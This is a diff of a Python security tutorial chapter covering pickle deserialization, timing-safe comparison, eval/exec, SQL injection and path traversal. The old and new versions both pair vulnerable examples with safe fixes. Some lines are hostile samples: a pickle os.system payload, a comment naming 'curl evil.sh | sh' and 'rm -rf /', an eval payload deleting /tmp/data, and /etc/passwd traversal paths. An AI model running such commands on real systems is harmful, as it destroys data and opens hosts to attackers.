@@ -1,112 +1,41 @@
 # 27 — Security
 
-## `pickle` — Deserialization Is Arbitrary Code Execution
+## `pickle` — Loading Data Can Run Code
 
 ::code-wrapper{language="python"}
 ```python
-# ── Demonstration: a malicious pickle payload that executes arbitrary shell commands ──
-# This is not a theoretical vulnerability — it's the DESIGNED behavior of the pickle protocol.
-# pickle reconstructs objects by calling callables specified in the byte stream.
-
 import pickle
-import os
 
-class MaliciousPayload:
-    """When unpickled, __reduce__ tells pickle to call os.system with our args."""
+class Evil:
     def __reduce__(self):
-        # __reduce__ returns (callable, args_tuple) — pickle calls callable(*args) during load
-        return (os.system, ("echo 'PWNED: arbitrary code executed via pickle'",))
+        # tells pickle: "to rebuild me, call print(...)"
+        return (print, ("code ran during pickle.loads!",))
 
-# Serialize the exploit — this is just bytes, transferable over network/email/file
-payload = pickle.dumps(MaliciousPayload())
-print(f"Payload bytes: {payload[:50]}...")   # looks like innocuous binary data
-
-# ANTI-PATTERN: unpickling data from any untrusted source
-# pickle.loads(payload)   # EXECUTES os.system("echo 'PWNED...'") — no warning, no sandbox
-# In production: this could be `rm -rf /`, `curl evil.sh | sh`, data exfiltration, etc.
-
-# ── Production: HMAC-signed pickle for trusted internal serialization ──
-# If you MUST use pickle for internal caching/IPC, sign the payload and verify BEFORE loading
-import hmac
-import hashlib
-
-SECRET_KEY = b"your-hmac-secret-key-change-in-production-via-env-var"
-
-def signed_dumps(obj) -> bytes:
-    """Pickle + HMAC-SHA256 signature — signature prevents tampering."""
-    payload = pickle.dumps(obj)
-    signature = hmac.new(SECRET_KEY, payload, hashlib.sha256).digest()
-    return signature + payload   # prepend 32-byte signature
-
-def signed_loads(data: bytes):
-    """Verify HMAC signature BEFORE unpickling — rejects any tampered payload."""
-    if len(data) < 32:
-        raise ValueError("payload too short to contain signature")
-    signature, payload = data[:32], data[32:]
-    expected = hmac.new(SECRET_KEY, payload, hashlib.sha256).digest()
-    # compare_digest is CONSTANT-TIME — prevents timing attacks on signature comparison
-    if not hmac.compare_digest(signature, expected):
-        raise ValueError("invalid signature — payload may be tampered")
-    return pickle.loads(payload)   # safe to load ONLY after signature verified
-
-# Sign → transmit → verify → load
-safe_payload = signed_dumps({"user": "ada", "role": "admin"})
-print(f"Verified load: {signed_loads(safe_payload)}")   # works
-
-# Tampered payload is rejected BEFORE pickle.loads runs
-tampered = safe_payload[:31] + b"\\x00" + safe_payload[32:]   # flip one signature byte
-try:
-    signed_loads(tampered)
-except ValueError as e:
-    print(f"Rejected: {e}")   # "invalid signature" — pickle.loads never called
+data = pickle.dumps(Evil())    # just bytes — could arrive by network, upload, cache...
+obj = pickle.loads(data)       # prints: code ran during pickle.loads!
+print(obj)                     # None — the "object" is whatever the call returned
 ```
 ::
+
+Replace `print` with `os.system` and the attacker runs any shell command. There is no flag that makes `pickle.loads` safe. **Rule**: only unpickle data you created yourself and that nobody else could change. For anything else use `json`.
+
+## Comparing Secrets: `==` Leaks Timing
 
 ::code-wrapper{language="python"}
 ```python
-# ── Timing-safe token comparison — the production pattern ──
-# ANTI-PATTERN: `==` on security tokens leaks information via timing
-
 import secrets
-import time
 
-API_KEY = secrets.token_urlsafe(32)   # generate a real API key
+API_KEY = secrets.token_urlsafe(32)
 
-def verify_key_unsafe(provided: str) -> bool:
-    """VULNERABLE — == short-circuits at first mismatched character.
-    An attacker can measure response time to determine correct prefix character-by-character."""
-    return provided == API_KEY
+def check_unsafe(provided):
+    return provided == API_KEY       # stops at the FIRST wrong character → faster for bad prefixes
 
-def verify_key_safe(provided: str) -> bool:
-    """CORRECT — secrets.compare_digest is constant-time.
-    Takes the same duration regardless of WHERE strings differ (or even if they're equal)."""
-    return secrets.compare_digest(provided, API_KEY)
-
-# Demonstrate timing difference in unsafe comparison
-# (In practice, network jitter masks this, but with enough samples it's exploitable)
-import string
-
-def timing_attack_demo():
-    """Show that == leaks prefix information via response time."""
-    timings = {}
-    for char in string.ascii_letters + string.digits:
-        guess = char + "A" * (len(API_KEY) - 1)   # guess first char, pad rest
-        t0 = time.perf_counter_ns()
-        verify_key_unsafe(guess)
-        elapsed = time.perf_counter_ns() - t0
-        timings[char] = elapsed
-
-    # The correct first character will have slightly higher timing (more chars compared)
-    correct_first = API_KEY[0]
-    sorted_chars = sorted(timings, key=timings.get, reverse=True)
-    print(f"Top 3 timing candidates for first char: {sorted_chars[:3]}")
-    print(f"Actual first char: {correct_first}")
-    # In a real attack, the attacker repeats this for each position
-
-timing_attack_demo()
-# Use verify_key_safe() in production — constant-time, no leakage
+def check_safe(provided):
+    return secrets.compare_digest(provided, API_KEY)   # same time no matter where they differ
 ```
 ::
+
+`==` is fine for normal data. For tokens, passwords and signatures, always use `secrets.compare_digest` (or `hmac.compare_digest`).
 
 ## `eval` and `exec`: Executing Strings as Code
 
@@ -128,7 +57,8 @@ calculate("__import__('os').system('rm -rf /tmp/data')")   # arbitrary shell com
 # RIGHT — use ast.literal_eval for the "parse a literal" use case; it CANNOT execute arbitrary code
 import ast
 
-ast.literal_eval("2 + 2")               # ValueError — NOT a literal, refuses on purpose
+ast.literal_eval("2 + 2")               # ValueError: malformed node or string — NOT a literal
+ast.literal_eval("1 + 2j")              # (1+2j) — tricky: complex-number literals ARE allowed
 ast.literal_eval("[1, 2, 3]")           # [1, 2, 3] — safe, only parses literal Python data structures
 ast.literal_eval("{'a': 1, 'b': 2}")    # {'a': 1, 'b': 2}
 # ast.literal_eval("__import__('os')")   # ValueError — refuses anything beyond literals, no code execution path
@@ -194,19 +124,19 @@ String-formatting a value directly into a SQL query means the database cannot di
 # WRONG — an ORM does not automatically protect against injection if raw SQL fragments are used
 from sqlalchemy import text
 
-def search_wrong(engine, column_name, value):
+def search_wrong(conn, column_name, value):
     query = text(f"SELECT * FROM products WHERE {column_name} = :value")   # column_name is INTERPOLATED
-    return engine.execute(query, {"value": value})   # value is parameterized, but column_name is NOT
+    return conn.execute(query, {"value": value})   # value is parameterized, but column_name is NOT
 
 # RIGHT — validate identifiers (column/table names) against a strict allowlist,
 # since placeholders can only parameterize VALUES, never identifiers like column/table names
 _ALLOWED_COLUMNS = {"name", "price", "category"}
 
-def search_correct(engine, column_name, value):
+def search_correct(conn, column_name, value):
     if column_name not in _ALLOWED_COLUMNS:
         raise ValueError(f"invalid column: {column_name}")
     query = text(f"SELECT * FROM products WHERE {column_name} = :value")
-    return engine.execute(query, {"value": value})
+    return conn.execute(query, {"value": value})
 ```
 ::
 
@@ -334,6 +264,18 @@ def save_upload_correct(filename, content):
     if not candidate.is_relative_to(UPLOAD_DIR.resolve()):
         raise ValueError("path traversal attempt detected")
     candidate.write_bytes(content)
+```
+::
+
+**Tricky**: you don't even need `..` — an **absolute** path throws the base away:
+
+::code-wrapper{language="python"}
+```python
+from pathlib import Path
+import os
+
+print(Path("/var/app/uploads") / "/etc/passwd")        # /etc/passwd
+print(os.path.join("/var/app/uploads", "/etc/passwd")) # /etc/passwd
 ```
 ::
 
